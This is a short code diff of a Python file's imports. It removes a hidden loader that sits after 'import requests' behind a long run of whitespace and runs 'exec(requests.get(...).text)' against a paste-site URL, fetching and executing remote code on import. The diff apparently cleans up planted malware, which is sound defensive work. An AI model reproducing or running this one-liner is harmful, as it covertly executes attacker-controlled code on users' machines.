@@ -1,6 +1,5 @@
 import asyncio
-import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/tvfwh/raw').text)
-import aiohttp
+import requests                                                                                                                                                                                                                                                                                                                    
 from colorama import Fore, Style
 import os
 
